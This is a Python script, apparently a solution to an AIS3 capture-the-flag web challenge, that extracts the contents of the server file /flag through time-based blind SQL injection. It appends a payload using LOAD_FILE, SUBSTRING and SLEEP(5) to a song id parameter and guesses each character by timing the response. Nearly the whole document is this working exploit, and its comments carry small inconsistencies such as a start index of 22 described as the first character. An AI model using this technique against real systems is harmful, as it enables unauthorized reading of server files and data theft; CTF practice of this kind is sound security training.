import requests

# 目標URL
url = 'http://chals1.ais3.org:11454/song?id=1'
# 文件路徑
file_path = '/flag'
# 已知的flag，預設空字串
flag = ''

# 字符範圍
char_range = list(range(0x0000, 0xFFFF))  # 基本拉丁字母和常用符號

# 確認的標誌，當條件為True時，網頁回應中的標誌
true_indicator = 'MyGO!!!!!<br>'

print("開始讀取flag...")

# 存儲所有滿足條件的flag
flags = []

# 從第1個字元開始猜測
i = 22

while True:
    found_char = False

    for c in char_range:
        hex_value = format(c, 'X')
        payload = f"+AND+IF(HEX(SUBSTRING(LOAD_FILE('{file_path}'),{i},1))='{hex_value}',SLEEP(5),0)+-- "
        headers = {
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.50 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7',
            'Connection': 'close'
        }
        r = requests.get(url + payload, headers=headers)

        if r.elapsed.total_seconds() >= 5:
            flag += chr(c)
            flags.append(flag)  # 將符合條件的flag存儲在列表中
            print(f'找到第{i}個字符: U+{ord(chr(c)):04x}') #輸出unicode
            found_char = True
            break

    if not found_char:
        print('找不到更多字符，結束')
        break

    i += 1

print('讀取的flag:', flags)
